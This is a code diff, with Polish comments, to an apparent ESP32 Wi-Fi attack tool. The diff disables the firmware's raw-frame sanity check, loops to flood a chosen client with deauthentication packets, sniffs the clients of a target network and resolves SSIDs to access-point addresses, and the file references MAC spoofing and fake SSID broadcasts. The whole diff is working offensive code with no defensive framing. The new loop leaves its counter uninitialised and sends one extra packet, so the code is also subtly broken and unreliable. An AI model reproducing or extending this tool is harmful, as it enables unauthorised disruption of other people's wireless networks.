@@ -3,6 +3,7 @@
 #include "WiFi.h"
 #include "networkKit.h"
 
+
 // Maksymalna liczba klientów, których można śledzić
 const int MAX_CLIENTS = 10;
 uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
@@ -14,14 +15,9 @@ uint8_t network_clients[MAX_CLIENTS][6];
 int client_count = 0;
 int target_channel = 1;
 
-//bypass stupid wifi restrictions
-//extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-//  return 0;
-//}
-//NOTE: Not needed implemented in other file
-
-// Liczba pakietów deauth do wysłania
-const int packet_count = 100;
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+  return 0;
+}
 
 // Flaga dla nowo wykrytych klientów
 bool new_clients_detected = false;
@@ -187,6 +183,7 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
 
 // Funkcja wysyłająca pakiety deauth do danego klienta
 bool send_deauth_packets(String &client_mac_str, int count) {
+  logMessage("Deauth inited on target: "+ client_mac_str);
   uint8_t client_mac[6];
   
   // Konwersja adresu MAC z string na tablicę bajtów
@@ -205,14 +202,29 @@ bool send_deauth_packets(String &client_mac_str, int count) {
     0x01, 0x00    // Powód deautoryzacji
   };
 
+
+  for(uint16_t i; i<=count; i++){
   esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
   if (result == ESP_OK) {
     logMessage("Packet sent successfully.");
-    return true;
+    delay(30);
   } else {
     logMessage("Error sending packet.");
-    return false;
   }
+  }
+  return true;
+}
+
+void initClientSniffing() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(&deauth_promiscuous_rx_cb);
+  esp_wifi_set_promiscuous(true);     // Enable sniffing AFTER setting callback
+  logMessage("Sniffing for network_clients...");
+}
+
+void stopClientSniffing(){
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_MODE_STA);
 }
 
 void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -229,6 +241,7 @@ void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (memcmp(addr1, target_mac, 6) == 0 || memcmp(addr2, target_mac, 6) == 0) {
     // Jeśli klient jest nowy, dodaj go do listy
     if (!is_client_known(addr2)) {
+      logMessage("Client ADDED");
       add_client(addr2);
     }
   }
@@ -241,13 +254,6 @@ bool is_client_known(uint8_t *mac) {
     }
   }
   return false;
-}
-
-void initClientSniffing() {
-  WiFi.mode(WIFI_STA);  // Ustawienie trybu WiFi na stację
-  esp_wifi_set_promiscuous(true);  // Włączenie trybu promiskuitywnego
-  esp_wifi_set_promiscuous_rx_cb(deauth_promiscuous_rx_cb);  // Ustawienie callback dla trybu promiskuitywnego
-  logMessage("Sniffing for network_clients...");
 }
 
 void get_clients_list(String client_list[], int &count) {
@@ -269,10 +275,10 @@ void add_client(uint8_t *mac) {
     memcpy(network_clients[client_count], mac, 6);
     client_count++;
     new_clients_detected = true;
-    Serial.print("Dodano nowego klienta: ");
+    logMessage("Dodano nowego klienta: ");
     for (int i = 0; i < 6; i++) {
       Serial.printf("%02X", mac[i]);
-      if (i < 5) Serial.print(":");
+      if (i < 5) logMessage(":");
     }
   } else {
     logMessage("Max client lenght is abused.");
@@ -282,10 +288,10 @@ void add_client(uint8_t *mac) {
 void setMac(uint8_t new_mac[6]) {
   memcpy(target_mac, new_mac, 6);  // Kopiowanie nowego adresu MAC do target_mac
 
-  Serial.print("Target MAC ustawiony na: ");
+  logMessage("Target MAC ustawiony na: ");
   for (int i = 0; i < 6; i++) {
     Serial.printf("%02X", target_mac[i]);
-    if (i < 5) Serial.print(":");
+    if (i < 5) logMessage(":");
   }
 }
 
@@ -293,10 +299,10 @@ bool set_mac_address(uint8_t new_mac[6]) {
   esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, new_mac);  // Ustawienie MAC dla interfejsu stacji (WIFI_STA)
 
   if (result == ESP_OK) {
-    Serial.print("Adres MAC ustawiony na: ");
+    logMessage("Adres MAC ustawiony na: ");
     for (int i = 0; i < 6; i++) {
       Serial.printf("%02X", new_mac[i]);
-      if (i < 5) Serial.print(":");
+      if (i < 5) logMessage(":");
     }
     return true;  // Sukces
   } else {
@@ -331,20 +337,21 @@ void clearClients() {
   logMessage("Client table cleared successfully.");
 }
 
-void set_target_channel(const char* target_ssid) {
+uint8_t set_target_channel(const char* target_ssid) {
     int networks = WiFi.scanNetworks();
     for (int i = 0; i < networks; i++) {
         if (strcmp(WiFi.SSID(i).c_str(), target_ssid) == 0) {
             target_channel = WiFi.channel(i);
-            Serial.print("Detected target network: ");
+            logMessage("Detected target network: ");
             logMessage(target_ssid);
-            Serial.print("Setting chanel to: ");
+            logMessage("Setting chanel to: ");
             logMessage(String(target_channel));
             esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
-            return;
+            return target_channel;
         }
     }
     logMessage("ERROR!");
+    return 0;
 }
 
 
@@ -413,3 +420,20 @@ String macToString(const uint8_t *mac) {
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     return String(macStr);
 }
+
+uint8_t* ssidToMac(const String& targetSSID) {
+  logMessage("Searching for mac for SSID:" + targetSSID);
+  WiFi.mode(WIFI_MODE_STA);
+  int wifiCount = WiFi.scanNetworks(false);
+  if (wifiCount <= 0) return nullptr;
+
+  for (int i = 0; i < wifiCount; i++) {
+    if (WiFi.SSID(i) == targetSSID) {
+      logMessage("Found match, exiting");
+      return WiFi.BSSID(i);  // valid until next scan
+    }
+  }
+  logMessage("match not found, returning nullptr");
+  return nullptr;
+}
+
